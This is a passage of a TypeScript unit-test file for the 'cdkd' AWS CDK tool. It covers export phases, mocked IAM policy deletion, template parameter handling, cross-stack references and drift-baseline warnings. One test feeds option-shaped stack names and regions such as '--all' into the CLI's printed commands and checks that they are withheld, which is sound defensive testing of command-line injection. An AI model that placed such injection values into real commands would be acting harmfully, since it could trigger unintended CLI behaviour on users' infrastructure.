      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });
});

describe('isPhase2CreatableType', () => {
  it('matches every Custom::* type (CFn CREATEs in phase 2)', () => {
    expect(isPhase2CreatableType('Custom::MyHandler')).toBe(true);
    expect(isPhase2CreatableType('Custom::SomethingElse')).toBe(true);
    expect(isPhase2CreatableType('Custom::AWSCDKOpenIdConnectProvider')).toBe(true);
  });

  it('matches AWS::CloudFormation::CustomResource (untyped cdk.CustomResource)', () => {
    // `new cdk.CustomResource(...)` without `resourceType` synthesizes to
    // this CFn resource type. Functionally identical to Custom::* — Lambda-
    // backed, no AWS resource state — so it also goes through phase 2.
    expect(isPhase2CreatableType('AWS::CloudFormation::CustomResource')).toBe(true);
  });

  it('does NOT match AWS::CloudFormation::Stack (nested stacks are not phase-2 creatable)', () => {
    // Nested stacks are handled by a dedicated branch in `buildImportPlan` that
    // routes the row through the state-tree walker (issue #464 PR B1) and
    // ultimately through CFn IMPORT's `--include-nested-stacks` (PR B2). They
    // are NOT phase-2 creatable — phase 2 would create a duplicate AWS::CFn::Stack
    // record rather than adopting the existing nested children.
    expect(isPhase2CreatableType('AWS::CloudFormation::Stack')).toBe(false);
  });

  it('does NOT match importable resource types', () => {
    expect(isPhase2CreatableType('AWS::S3::Bucket')).toBe(false);
    expect(isPhase2CreatableType('AWS::Lambda::Function')).toBe(false);
    expect(isPhase2CreatableType('AWS::IAM::Role')).toBe(false);
  });

  it('does NOT match AWS::CDK::Metadata (silent-drop, not phase 2)', () => {
    expect(isPhase2CreatableType('AWS::CDK::Metadata')).toBe(false);
  });
});

describe('isImportUnsupportedRecreatableType', () => {
  // Types in IMPORT_UNSUPPORTED_RECREATABLE_TYPES: cdkd skips them from
  // phase-1 IMPORT, deletes the AWS-side resource between phases, and
  // lets CFn re-CREATE in phase 2 (closes cdkd issue #307). Verified via
  // `aws cloudformation describe-type --type RESOURCE --type-name <T> |
  // jq .handlers`.
  it('does NOT match AWS::ApiGatewayV2::Stage: CFn imports it (issue #1772)', () => {
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Stage')).toBe(false);
  });

  it('matches AWS::IAM::Policy (no read/list handler; inline policy has no AWS-side id)', () => {
    // CDK auto-emits this type for L2 grants (ECS Task Execution Role ECR-pull
    // policy, Lambda execution-role inline policies, etc.). Found via real
    // export against cdk-sample on 2026-05-12 — the dry-run plan put it in
    // phase-1 imports, real run would fail at CreateChangeSet.
    expect(isImportUnsupportedRecreatableType('AWS::IAM::Policy')).toBe(true);
  });

  it('does NOT match sibling ApiGwV2 types (they have IMPORT handlers)', () => {
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Api')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Integration')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Route')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Deployment')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::ApiGatewayV2::Authorizer')).toBe(false);
  });

  it('does NOT match AWS::ApiGateway::Stage (v1 Stage has IMPORT handler)', () => {
    expect(isImportUnsupportedRecreatableType('AWS::ApiGateway::Stage')).toBe(false);
  });

  it('does NOT match Custom Resources (those go to phase2Creates, not recreate-before-phase2)', () => {
    expect(isImportUnsupportedRecreatableType('Custom::MyHandler')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::CloudFormation::CustomResource')).toBe(false);
  });

  it('does NOT match standard importable types', () => {
    expect(isImportUnsupportedRecreatableType('AWS::S3::Bucket')).toBe(false);
    expect(isImportUnsupportedRecreatableType('AWS::Lambda::Function')).toBe(false);
  });
});

describe('invokePreDeleteHandler', () => {
  // Each handler does a dynamic `import()` of its SDK client inside its body,
  // so each test re-mocks the package; vi.doMock + vi.resetModules applied
  // per-test isolates each scenario from the others.
  beforeEach(() => {
    vi.resetModules();
  });

  it('throws when no handler is registered for the type', async () => {
    await expect(
      invokePreDeleteHandler('AWS::Made::Up::Type', {
        logicalId: 'X',
        resourceType: 'AWS::Made::Up::Type',
        physicalId: 'x',
        properties: {},
      })
    ).rejects.toThrow(/no pre-delete handler registered/);
  });

  it('has no AWS::ApiGatewayV2::Stage handler: the stage is imported, never deleted (issue #1772)', async () => {
    await expect(
      invokePreDeleteHandler('AWS::ApiGatewayV2::Stage', {
        logicalId: 'HttpApiDefaultStage',
        resourceType: 'AWS::ApiGatewayV2::Stage',
        physicalId: '$default',
        properties: { ApiId: 'doptkc8n2i' },
      })
    ).rejects.toThrow(/no pre-delete handler registered/);
  });

  // ─── AWS::IAM::Policy handler tests ──────────────────────────────
  //
  // Inline policy attachments are per-target (Roles / Users / Groups).
  // The handler walks each target list and issues the appropriate Delete
  // call. NoSuchEntityException is idempotent (matches IAMPolicyProvider.
  // delete in src/provisioning/providers/iam-policy-provider.ts).

  it('AWS::IAM::Policy handler walks Roles and issues DeleteRolePolicy per role', async () => {
    const sendCalls: { cmdName: string; input: Record<string, unknown> }[] = [];
    vi.doMock('@aws-sdk/client-iam', () => ({
      IAMClient: class {
        async send(cmd: { __cmdName: string; input: Record<string, unknown> }) {
          sendCalls.push({ cmdName: cmd.__cmdName, input: cmd.input });
        }
      },
      DeleteRolePolicyCommand: class {
        readonly __cmdName = 'DeleteRolePolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteUserPolicyCommand: class {
        readonly __cmdName = 'DeleteUserPolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteGroupPolicyCommand: class {
        readonly __cmdName = 'DeleteGroupPolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      NoSuchEntityException: class extends Error {
        readonly name = 'NoSuchEntityException';
      },
    }));
    const { invokePreDeleteHandler: handler } = await import(
      '../../../src/cli/commands/export.js'
    );

    await handler('AWS::IAM::Policy', {
      logicalId: 'EcrPullPolicy',
      resourceType: 'AWS::IAM::Policy',
      physicalId: 'ecr-pull-policy',
      properties: { Roles: ['RoleA', 'RoleB'] },
    });

    expect(sendCalls).toHaveLength(2);
    expect(sendCalls[0]).toEqual({
      cmdName: 'DeleteRolePolicy',
      input: { RoleName: 'RoleA', PolicyName: 'ecr-pull-policy' },
    });
    expect(sendCalls[1]).toEqual({
      cmdName: 'DeleteRolePolicy',
      input: { RoleName: 'RoleB', PolicyName: 'ecr-pull-policy' },
    });
  });

  it('AWS::IAM::Policy handler walks Users + Groups when set', async () => {
    const sendCalls: { cmdName: string; input: Record<string, unknown> }[] = [];
    vi.doMock('@aws-sdk/client-iam', () => ({
      IAMClient: class {
        async send(cmd: { __cmdName: string; input: Record<string, unknown> }) {
          sendCalls.push({ cmdName: cmd.__cmdName, input: cmd.input });
        }
      },
      DeleteRolePolicyCommand: class {
        readonly __cmdName = 'DeleteRolePolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteUserPolicyCommand: class {
        readonly __cmdName = 'DeleteUserPolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteGroupPolicyCommand: class {
        readonly __cmdName = 'DeleteGroupPolicy';
        constructor(public input: Record<string, unknown>) {}
      },
      NoSuchEntityException: class extends Error {
        readonly name = 'NoSuchEntityException';
      },
    }));
    const { invokePreDeleteHandler: handler } = await import(
      '../../../src/cli/commands/export.js'
    );

    await handler('AWS::IAM::Policy', {
      logicalId: 'P',
      resourceType: 'AWS::IAM::Policy',
      physicalId: 'p',
      properties: { Users: ['UserA'], Groups: ['GroupA', 'GroupB'] },
    });

    expect(sendCalls.map((c) => c.cmdName)).toEqual([
      'DeleteUserPolicy',
      'DeleteGroupPolicy',
      'DeleteGroupPolicy',
    ]);
  });

  it('AWS::IAM::Policy handler normalizes legacy `policyName:roleName` physicalId', async () => {
    // Pre-v0.74 state (CC API code path) stored physicalId as
    // `policyName:roleName`. The provider's own delete strips the suffix;
    // the pre-delete handler mirrors that so legacy state still produces
    // the bare policy name as input to DeleteRolePolicy.
    const sendCalls: Record<string, unknown>[] = [];
    vi.doMock('@aws-sdk/client-iam', () => ({
      IAMClient: class {
        async send(cmd: { input: Record<string, unknown> }) {
          sendCalls.push(cmd.input);
        }
      },
      DeleteRolePolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteUserPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteGroupPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      NoSuchEntityException: class extends Error {
        readonly name = 'NoSuchEntityException';
      },
    }));
    const { invokePreDeleteHandler: handler } = await import(
      '../../../src/cli/commands/export.js'
    );

    await handler('AWS::IAM::Policy', {
      logicalId: 'P',
      resourceType: 'AWS::IAM::Policy',
      physicalId: 'my-policy:my-role', // legacy CC-API shape
      properties: { Roles: ['my-role'] },
    });

    expect(sendCalls).toEqual([{ RoleName: 'my-role', PolicyName: 'my-policy' }]);
  });

  it('AWS::IAM::Policy handler treats NoSuchEntityException as idempotent success', async () => {
    // After a partial pre-delete retry — some targets succeeded last time,
    // re-running the export hits AWS with "already gone" on those. Must
    // continue, not abort.
    class FakeNoSuchEntity extends Error {
      readonly name = 'NoSuchEntityException';
    }
    let callIndex = 0;
    vi.doMock('@aws-sdk/client-iam', () => ({
      IAMClient: class {
        async send() {
          // Throw on the first send (already-gone Role); second send (live
          // Role) succeeds. The handler must not abort on the first.
          if (callIndex++ === 0) {
            throw new FakeNoSuchEntity('Policy not found on role');
          }
          // success — no return value needed
        }
      },
      DeleteRolePolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteUserPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteGroupPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      NoSuchEntityException: FakeNoSuchEntity,
    }));
    const { invokePreDeleteHandler: handler } = await import(
      '../../../src/cli/commands/export.js'
    );

    // Two Roles: first one returns NoSuchEntity, second one succeeds.
    // The handler must complete without throwing.
    await expect(
      handler('AWS::IAM::Policy', {
        logicalId: 'P',
        resourceType: 'AWS::IAM::Policy',
        physicalId: 'p',
        properties: { Roles: ['AlreadyGoneRole', 'LiveRole'] },
      })
    ).resolves.toBeUndefined();
    expect(callIndex).toBe(2);
  });

  it('AWS::IAM::Policy handler throws when state has no Roles/Users/Groups attachment', async () => {
    // Defensive: state schema invariant says every IAM::Policy has at least
    // one attachment. If state is corrupt and all three arrays are
    // empty/missing, abort with a clear error rather than silently no-op
    // (which would let phase-2 proceed against a still-attached policy).
    vi.doMock('@aws-sdk/client-iam', () => ({
      IAMClient: class {
        async send() {
          throw new Error('should not reach AWS');
        }
      },
      DeleteRolePolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteUserPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      DeleteGroupPolicyCommand: class {
        constructor(public input: Record<string, unknown>) {}
      },
      NoSuchEntityException: class extends Error {
        readonly name = 'NoSuchEntityException';
      },
    }));
    const { invokePreDeleteHandler: handler } = await import(
      '../../../src/cli/commands/export.js'
    );

    await expect(
      handler('AWS::IAM::Policy', {
        logicalId: 'P',
        resourceType: 'AWS::IAM::Policy',
        physicalId: 'p',
        properties: {}, // no Roles/Users/Groups
      })
    ).rejects.toThrow(/no Roles\/Users\/Groups attachment/);
  });
});

describe('injectDeletionPolicyForImport', () => {
  it('adds DeletionPolicy: Delete on resources lacking the attribute', () => {
    // v0.94.8 switched the injection default from Retain to Delete: matches
    // the CFn type-default behavior for resources without explicit
    // RemovalPolicy, so post-export `cdk diff` sees no Retain→absent diff
    // and the user's mental model stays "= CDK convention". See
    // injectDeletionPolicyForImport's docstring for the Retain-vs-Delete
    // rationale.
    const template: Record<string, unknown> = {
      Resources: {
        Role: { Type: 'AWS::IAM::Role', Properties: {} },
        Topic: { Type: 'AWS::SNS::Topic', Properties: {} },
      },
    };
    const injected = injectDeletionPolicyForImport(template);
    expect(injected).toBe(2);
    expect((template['Resources'] as Record<string, Record<string, unknown>>)['Role']!['DeletionPolicy']).toBe('Delete');
    expect((template['Resources'] as Record<string, Record<string, unknown>>)['Topic']!['DeletionPolicy']).toBe('Delete');
  });

  it('preserves resources that already declare DeletionPolicy (any value)', () => {
    const template: Record<string, unknown> = {
      Resources: {
        Bucket: { Type: 'AWS::S3::Bucket', Properties: {}, DeletionPolicy: 'Delete' },
        Snapshot: { Type: 'AWS::RDS::DBInstance', Properties: {}, DeletionPolicy: 'Snapshot' },
        Existing: { Type: 'AWS::IAM::Role', Properties: {}, DeletionPolicy: 'Retain' },
      },
    };
    const injected = injectDeletionPolicyForImport(template);
    expect(injected).toBe(0);
    const resources = template['Resources'] as Record<string, Record<string, unknown>>;
    expect(resources['Bucket']!['DeletionPolicy']).toBe('Delete');
    expect(resources['Snapshot']!['DeletionPolicy']).toBe('Snapshot');
    expect(resources['Existing']!['DeletionPolicy']).toBe('Retain');
  });

  it('does NOT inject UpdateReplacePolicy (only DeletionPolicy required by IMPORT)', () => {
    const template: Record<string, unknown> = {
      Resources: {
        Role: { Type: 'AWS::IAM::Role', Properties: {} },
      },
    };
    injectDeletionPolicyForImport(template);
    expect(
      (template['Resources'] as Record<string, Record<string, unknown>>)['Role']!['UpdateReplacePolicy']
    ).toBeUndefined();
  });

  it('handles a mix of missing + present DeletionPolicy entries', () => {
    const template: Record<string, unknown> = {
      Resources: {
        Bucket: { Type: 'AWS::S3::Bucket', Properties: {}, DeletionPolicy: 'Delete' },
        Role: { Type: 'AWS::IAM::Role', Properties: {} },
        Topic: { Type: 'AWS::SNS::Topic', Properties: {} },
      },
    };
    const injected = injectDeletionPolicyForImport(template);
    expect(injected).toBe(2);
    const resources = template['Resources'] as Record<string, Record<string, unknown>>;
    expect(resources['Bucket']!['DeletionPolicy']).toBe('Delete');
    expect(resources['Role']!['DeletionPolicy']).toBe('Delete');
    expect(resources['Topic']!['DeletionPolicy']).toBe('Delete');
  });

  it('returns 0 for a template with no Resources section', () => {
    const template: Record<string, unknown> = { AWSTemplateFormatVersion: '2010-09-09' };
    expect(injectDeletionPolicyForImport(template)).toBe(0);
  });

  it('returns 0 for an empty Resources object', () => {
    const template: Record<string, unknown> = { Resources: {} };
    expect(injectDeletionPolicyForImport(template)).toBe(0);
  });
});

describe('parseParameterOverrides', () => {
  it('returns empty map for undefined / empty input', () => {
    expect(parseParameterOverrides(undefined)).toEqual({});
    expect(parseParameterOverrides([])).toEqual({});
  });

  it('parses Key=Value tokens', () => {
    expect(parseParameterOverrides(['Env=prod', 'Region=us-east-1'])).toEqual({
      Env: 'prod',
      Region: 'us-east-1',
    });
  });

  it('preserves Value content including embedded "="', () => {
    expect(parseParameterOverrides(['Equation=x=y+z'])).toEqual({ Equation: 'x=y+z' });
  });

  it('rejects tokens without "="', () => {
    expect(() => parseParameterOverrides(['Bare'])).toThrow(/expected 'Key=Value'/);
  });

  it('rejects tokens with empty key', () => {
    expect(() => parseParameterOverrides(['=value'])).toThrow(/expected 'Key=Value'/);
  });
});

describe('resolveTemplateParameters', () => {
  it('returns empty array when template has no Parameters section', () => {
    const result = resolveTemplateParameters({ Resources: {} }, {});
    expect(result).toEqual({ parameters: [], missing: [] });
  });

  it('uses defaults when no overrides supplied', () => {
    const tpl = {
      Parameters: {
        Env: { Type: 'String', Default: 'dev' },
        BootstrapVersion: { Type: 'String', Default: '12' },
      },
    };
    const result = resolveTemplateParameters(tpl, {});
    expect(result.missing).toEqual([]);
    expect(result.parameters).toEqual([
      { ParameterKey: 'Env', ParameterValue: 'dev' },
      { ParameterKey: 'BootstrapVersion', ParameterValue: '12' },
    ]);
  });

  it('user override beats template Default', () => {
    const tpl = { Parameters: { Env: { Type: 'String', Default: 'dev' } } };
    const result = resolveTemplateParameters(tpl, { Env: 'prod' });
    expect(result.parameters).toEqual([{ ParameterKey: 'Env', ParameterValue: 'prod' }]);
  });

  it('coerces non-string defaults to string', () => {
    const tpl = { Parameters: { Count: { Type: 'Number', Default: 5 } } };
    const result = resolveTemplateParameters(tpl, {});
    expect(result.parameters).toEqual([{ ParameterKey: 'Count', ParameterValue: '5' }]);
  });

  it('reports parameters without defaults as missing when no override', () => {
    const tpl = {
      Parameters: {
        Required: { Type: 'String' },
        Optional: { Type: 'String', Default: 'x' },
      },
    };
    const result = resolveTemplateParameters(tpl, {});
    expect(result.missing).toEqual(['Required']);
    expect(result.parameters).toEqual([{ ParameterKey: 'Optional', ParameterValue: 'x' }]);
  });

  it('user override satisfies a parameter without Default', () => {
    const tpl = { Parameters: { Required: { Type: 'String' } } };
    const result = resolveTemplateParameters(tpl, { Required: 'set' });
    expect(result.missing).toEqual([]);
    expect(result.parameters).toEqual([{ ParameterKey: 'Required', ParameterValue: 'set' }]);
  });

  it('throws when an override targets a parameter not in the template', () => {
    const tpl = { Parameters: { Env: { Type: 'String', Default: 'dev' } } };
    expect(() => resolveTemplateParameters(tpl, { Typo: 'oops' })).toThrow(
      /does not match any parameter/
    );
  });

  it('throws when overrides supplied but template has no Parameters section', () => {
    expect(() => resolveTemplateParameters({ Resources: {} }, { Env: 'prod' })).toThrow(
      /template has no Parameters section/
    );
  });
});

describe('scanCrossStackReferences', () => {
  it('returns empty when no other stacks reference the target', () => {
    const stacks = [
      { stackName: 'Exporting', template: { Resources: {} } },
      { stackName: 'Other', template: { Resources: { R: { Type: 'AWS::S3::Bucket' } } } },
    ];
    expect(scanCrossStackReferences(stacks, 'Exporting')).toEqual([]);
  });

  it('finds object-form Fn::GetStackOutput in another stack', () => {
    const stacks = [
      { stackName: 'Exporting', template: { Resources: {} } },
      {
        stackName: 'Consumer',
        template: {
          Resources: {
            Lambda: {
              Type: 'AWS::Lambda::Function',
              Properties: {
                Environment: {
                  Variables: {
                    PROD_URL: {
                      'Fn::GetStackOutput': { StackName: 'Exporting', OutputName: 'ApiUrl' },
                    },
                  },
                },
              },
            },
          },
        },
      },
    ];
    const result = scanCrossStackReferences(stacks, 'Exporting');
    expect(result).toHaveLength(1);
    expect(result[0]!.consumerStackName).toBe('Consumer');
    expect(result[0]!.outputName).toBe('ApiUrl');
  });

  it('finds legacy array-form Fn::GetStackOutput', () => {
    const stacks = [
      { stackName: 'Exporting', template: {} },
      {
        stackName: 'Consumer',
        template: { Outputs: { X: { Value: { 'Fn::GetStackOutput': ['Exporting', 'Out'] } } } },
      },
    ];
    const result = scanCrossStackReferences(stacks, 'Exporting');
    expect(result).toHaveLength(1);
    expect(result[0]!.outputName).toBe('Out');
  });

  it('does NOT flag references to OTHER stacks', () => {
    const stacks = [
      { stackName: 'Exporting', template: {} },
      {
        stackName: 'Consumer',
        template: {
          Resources: {
            R: {
              Properties: {
                X: { 'Fn::GetStackOutput': { StackName: 'NotMe', OutputName: 'Y' } },
              },
            },
          },
        },
      },
    ];
    expect(scanCrossStackReferences(stacks, 'Exporting')).toEqual([]);
  });

  it('ignores the exporting stack itself', () => {
    const stacks = [
      {
        stackName: 'Exporting',
        template: {
          Resources: {
            R: {
              Properties: {
                X: { 'Fn::GetStackOutput': { StackName: 'Exporting', OutputName: 'Y' } },
              },
            },
          },
        },
      },
    ];
    expect(scanCrossStackReferences(stacks, 'Exporting')).toEqual([]);
  });

  it('captures all references when multiple consumers exist', () => {
    const stacks = [
      { stackName: 'Exporting', template: {} },
      {
        stackName: 'C1',
        template: {
          Resources: {
            R: {
              Properties: { X: { 'Fn::GetStackOutput': { StackName: 'Exporting', OutputName: 'A' } } },
            },
          },
        },
      },
      {
        stackName: 'C2',
        template: {
          Outputs: { O: { Value: { 'Fn::GetStackOutput': { StackName: 'Exporting', OutputName: 'B' } } } },
        },
      },
    ];
    const result = scanCrossStackReferences(stacks, 'Exporting');
    expect(result).toHaveLength(2);
    const summary = result.map((r) => `${r.consumerStackName}.${r.outputName}`).sort();
    expect(summary).toEqual(['C1.A', 'C2.B']);
  });
});

describe('reportDriftBaselineGaps', () => {
  function makeLogger() {
    return { warn: vi.fn(), info: vi.fn(), debug: vi.fn(), error: vi.fn(), setLevel: vi.fn() };
  }

  it('pastes nothing runnable at any granularity, through the reporter itself', () => {
    // The paste fence for THIS site's two commands (`cdkd state show` and
    // `cdkd state refresh-observed`, both built through the shared gate since
    // go-to-k/cdkd#3436's fold-in): every warning the reporter emits for an
    // ordinary name is inert in every span, and for each payload family as
    // the stack name and as the region the per-block criterion holds
    // (`tests/unit/utils/paste-harness.ts`).
    // Two shapes of state, because the two commands render on DIFFERENT
    // arms: a readable resource missing its baseline reaches the
    // `refresh-observed` line, and an UNREADABLE entry reaches the `state
    // show` one — and with an unreadable entry present the refresh line is
    // withheld in favour of "repair first" prose. Without the second shape
    // `unreadableCount` is zero and that command's builder is never reached.
    const render = (stackName: string, region: string, unreadable: boolean): string[] => {
      const logger = makeLogger();
      reportDriftBaselineGaps(
        {
          version: 3,
          stackName,
          region,
          resources: {
            R1: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} },
            ...(unreadable && {
              Bad: null as unknown as import('../../../src/types/state.js').ResourceState,
            }),
          },
          outputs: {},
          lastModified: 0,
        },
        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
      );
      const warned = logger.warn.mock.calls.map((c) => String(c[0]));
      expect(warned.length, `${stackName} / ${region}`).toBeGreaterThan(0);
      return warned;
    };
    withPasteDir((dir) => {
      const refresh = render('S', 'us-east-1', false);
      expect(refresh.join('\n')).toContain('cdkd state refresh-observed S --stack-region us-east-1');
      const inspect = render('S', 'us-east-1', true);
      expect(inspect.join('\n')).toContain('cdkd state show S --stack-region us-east-1 --json');
      for (const message of [...refresh, ...inspect]) expect(spansThatRun(message, dir)).toEqual([]);
      // The region keeps its 128 display cap through the gate (`maxCodePoints`):
      // one over it is a hole in the inspect command, at it is named.
      const capped = render('S', 'r'.repeat(129), true).join('\n');
      expect(capped).toContain("cdkd state show S --stack-region '<region>' --json");
      expect(capped).not.toContain('r'.repeat(129));
      expect(render('S', 'r'.repeat(128), true).join('\n')).toContain(
        `cdkd state show S --stack-region ${'r'.repeat(128)} --json`
      );
      // Inert at every granularity for every payload too: this report never
      // displays the name or region in prose, so the stronger contract holds
      // and is what is pinned.
      for (const { value } of PASTE_PAYLOADS) {
        for (const unreadable of [false, true]) {
          for (const message of render(value, 'us-east-1', unreadable)) {
            expect(spansThatRun(message, dir), value).toEqual([]);
          }
          for (const message of render('S', value, unreadable)) {
            expect(spansThatRun(message, dir), value).toEqual([]);
          }
        }
      }
      // A REGION beginning with `-` (read raw off the state body): the WRITE
      // command is withheld with the sentence naming the region, never printed
      // with an unexplained `'<region>'` hole (code review); the READ line
      // keeps its hole and says what it stands for.
      // A bare `-` too: the guard is the LEADING dash, not a dash plus more.
      for (const region of ['--all', '-x', '-']) {
        const optionRegion = render('S', region, false).join('\n');
        // The BUILT command is absent (the prose-quoted static
        // `'cdkd state refresh-observed'` in the withheld sentence is not it).
        expect(optionRegion, region).not.toMatch(/cdkd state refresh-observed S/);
        expect(optionRegion, region).not.toContain("'<region>'");
        // The sentence names the VALUE the gate refused, rendered from its
        // reason (M3 of the go-to-k/cdkd#3764 review) — and does not say the
        // CLI would read it as an option, which `--stack-region`'s value never
        // is (go-to-k/cdkd#4036).
        expect(optionRegion, region).toContain(
          "this stack's region starts with '-', which no AWS region does, so cdkd does not put it"
        );
        expect(optionRegion, region).not.toContain('reading it as an option');
      }
      // A STACK NAME beginning with `-` keeps the option sentence: it is the
      // positional Commander would read as the option.
      expect(render('--all', 'us-east-1', false).join('\n')).toContain(
        "this stack's name starts with '-', which cdkd refuses rather than risk the CLI reading it as an option"
      );
      // The READ line keeps its hole and explains it BEFORE the command, so
      // the command stays last and pasteable -- for an option-shaped region
      // and for a capped one alike (the explanation keys on `inspect.exact`,
      // not on one spelling).
      for (const region of ['--all', 'r'.repeat(129)]) {
        const line = render('S', region, true).join('\n');
        expect(line, region).toMatch(
          /hole in the command after the list below stands for [^\n]*after the list below\.\n(?: {2}[^\n]*\n)+Inspect it with: cdkd state show S --stack-region '<region>' --json$/m
        );
      }
      // ...and for a withheld STACK NAME with an ordinary region, so the
      // explanation keys on any hole, not on the region's alone.
      const stackHole = render('--all', 'us-east-1', true).join('\n');
      expect(stackHole).toMatch(
        /hole in the command after the list below stands for [^\n]*after the list below\.\n(?: {2}[^\n]*\n)+Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/m
      );
      // ...and for a NON-PLAIN stack name, which `plainIdent` holes where
      // exactness alone would have named it shell-quoted (M2 of the
      // go-to-k/cdkd#3764 review).
      const plainHole = render("It's Stack", 'us-east-1', true).join('\n');
      expect(plainHole).toMatch(
        /hole in the command after the list below stands for [^\n]*after the list below\.\n(?: {2}[^\n]*\n)+Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/m
      );
      // The listing it points at is the RAW one: `--long` trims through
      // `displayIdent`, so it would hand back the spelling the gate refused
      // (go-to-k/cdkd#3420).
      const FILL =
        "fill it from 'cdkd state list --json', replacing the hole, quotes included, with the value decoded from its JSON string, then shell-quoted.";
      const NO_FILL =
        "This stack name begins with '-', which the CLI could read as an option however it is " +
        'quoted, so do not fill the stack hole with it: repair or remove the record by hand.';
      expect(plainHole).toContain(FILL);
      expect(plainHole).not.toContain(NO_FILL);
      expect(plainHole).not.toContain('--long');
      // A stack name beginning with `-` gets NO fill-in: Commander would read
      // the pasted value in `cdkd state show`'s positional as an option
      // (go-to-k/cdkd#4036). Keyed on the RAW `-`, so an altered `--all ` and
      // an over-cap `--…` name, which the gate reports `altered` / `too-long`
      // rather than `option-shaped`, get it too — as does a withheld region
      // beside it, since the stack hole is still unfillable.
      for (const [stack, region] of [
        ['--all', 'us-east-1'],
        ['-x', 'us-east-1'],
        ['-', 'us-east-1'],
        ['--all ', 'us-east-1'],
        [`--${'q'.repeat(1200)}`, 'us-east-1'],
        ['--all', 'r'.repeat(129)],
      ] as const) {
        const text = render(stack, region, true).join('\n');
        expect(text, stack.slice(0, 8)).toContain(NO_FILL);
        expect(text, stack.slice(0, 8)).not.toContain(FILL);
        expect(text, stack.slice(0, 8)).toMatch(/Inspect it with: cdkd state show '<stack>' [^\n]*--json$/m);
      }
      // A withheld REGION beside an ordinary name keeps the fill-in: the
      // region is `--stack-region`'s value, which Commander takes as given.
      expect(render('S', '--all', true).join('\n')).toContain(FILL);
      expect(render('S', '--all', true).join('\n')).not.toContain(NO_FILL);
      expect(render('S', 'us-east-1', true).join('\n')).not.toContain('hole in the command after the list');
      // A NAMED command is on its own line too — not only a holed one — with
      // or without a region (go-to-k/cdkd#3436).
      for (const [region, command] of [
        ['us-east-1', 'cdkd state show S --stack-region us-east-1 --json'],
        ['', 'cdkd state show S --json'],
      ] as const) {
        const warns = render('S', region, true);
        const at = warns.indexOf(`Inspect it with: ${command}`);
        expect(at, region).toBeGreaterThan(0);
        // The pointer sentence, then ONLY the id rows, then the command: the
        // rows come before the command so they do not hang off it (m2 of the
        // go-to-k/cdkd#4011 review).
        const pointer = warns.findIndex((w) => w.endsWith('Inspect it with the command after the list below.'));
        expect(pointer, region).toBeGreaterThan(-1);
        expect(pointer).toBeLessThan(at - 1);
        for (const row of warns.slice(pointer + 1, at)) expect(row, region).toMatch(/^ {2}\S/);
        expect(warns[pointer]).not.toContain('cdkd state show');
      }
    });
  }, 120_000);

  it('warns nothing when every resource has observedProperties', () => {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 3,
        stackName: 'S',
        region: 'us-east-1',
        resources: {
          R1: { physicalId: 'p1', resourceType: 'AWS::S3::Bucket', properties: {}, observedProperties: {} },
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    expect(logger.warn).not.toHaveBeenCalled();
  });

  it('warns nothing for an empty state', () => {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      { version: 3, stackName: 'S', region: 'r', resources: {}, outputs: {}, lastModified: 0 },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    expect(logger.warn).not.toHaveBeenCalled();
  });

  it('warns about schema version 1/2 (pre-observedProperties)', () => {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 2,
        stackName: 'S',
        region: 'r',
        resources: { R1: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} } },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    expect(logger.warn).toHaveBeenCalledTimes(1);
    expect(logger.warn.mock.calls[0]![0]).toMatch(/schema is v2/);
  });

  it('warns about per-resource missing observedProperties at v3', () => {
    const logger = makeLogger();
    reportDriftBaselineGaps(
      {
        version: 3,
        stackName: 'S',
        region: 'r',
        resources: {
          R1: { physicalId: 'p1', resourceType: 'AWS::S3::Bucket', properties: {}, observedProperties: {} },
          R2: { physicalId: 'p2', resourceType: 'Custom::X', properties: {} }, // no observedProperties
        },
        outputs: {},
        lastModified: 0,
      },
      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
    );
    // 1 summary warn + 1 per-resource warn
    expect(logger.warn).toHaveBeenCalled();
    const calls = logger.warn.mock.calls.map((c) => c[0]).join('\n');
    expect(calls).toMatch(/1 of 2 resource\(s\)/);
    expect(calls).toMatch(/R2/);
  });

  it('reports a REFUSED baseline APART from a refreshable one (issue #2944)', () => {
    // Both halves lack `observedProperties`, but only ONE of them can be fixed
    // by the command this report tells the user to run. Since schema v10 a
    // `cdkd import` run can REFUSE a baseline, and `cdkd state refresh-observed`
    // now declines a refused resource — so tallying the two together sends the
    // user to a command that will do nothing for half the list and gives them
    // no way to tell which half.
    //
    // The assertions are per-SEGMENT rather than over the joined text, because
